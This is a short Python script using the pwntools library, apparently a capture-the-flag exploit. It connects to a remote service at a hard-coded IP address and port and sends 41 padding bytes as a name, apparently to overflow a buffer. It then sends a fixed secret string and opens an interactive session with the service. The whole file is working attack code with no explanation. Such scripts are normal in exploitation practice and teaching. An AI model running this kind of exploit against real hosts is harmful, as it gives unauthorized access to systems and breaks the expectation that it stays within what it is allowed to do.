from pwn import *

r = remote("54.169.55.172", 1024)

r.recvuntil(b'Give me your name: ')
payload = b'a'*41
r.sendline(payload)
r.recvuntil(b'Now send me some thing you want :))))')
r.sendline(b'w3Lc0m37iS')
r.interactive()
